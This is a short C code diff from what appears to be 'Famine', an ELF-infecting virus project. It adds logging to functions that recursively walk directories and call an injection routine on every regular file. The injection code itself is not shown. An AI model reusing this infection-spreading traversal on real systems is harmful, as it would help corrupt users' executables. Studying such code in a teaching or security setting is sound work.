@@ -3,11 +3,11 @@
 void famine(char *fullpath, void *input, int woody_init_ok) {
     FamineFile *file = famine_elf_file_get(fullpath);
     if (file != NULL) {
-        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
+        DBG("ELF file %s successfully. Size: %lu bytes\n", fullpath, file->size);
         famine_injection(file, input, woody_init_ok);
         destroy_famine_file(file);
     } else {
-        LOG(L_ERROR, "Failed to load ELF file.\n");
+        LOG(L_ERROR, "Failed to load ELF file %s.\n", fullpath);
     }
 }
 
@@ -23,11 +23,16 @@ void famine_process_recurcive(const char *path, void *input, int woody_init_ok) 
     }
 
     while ((entry = readdir(dir)) != NULL) {
+
+        INFO("Processing: %s/%s\n", path, entry->d_name);
+
         if (entry->d_type == DT_FIFO) {
+            INFO("Skipping FIFO directory entry: %s\n", entry->d_name);
             continue;
         }
 
         if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
+            INFO("Skipping special directory entry: %s\n", entry->d_name);
             continue;
         }
 
@@ -38,12 +43,15 @@ void famine_process_recurcive(const char *path, void *input, int woody_init_ok) 
         }
 
         if (lstat(fullpath, &st) == -1 || S_ISLNK(st.st_mode)) {
+            INFO("Skipping symlink or inaccessible entry: %s\n", fullpath);
             continue;
         }
 
         if (S_ISDIR(st.st_mode)) {
+            INFO("Entering directory: %s\n", fullpath);
             famine_process_recurcive(fullpath, input, woody_init_ok);
         } else {
+            INFO("Call famine on: %s\n", fullpath);
             famine(fullpath, input, woody_init_ok);
         }
     }
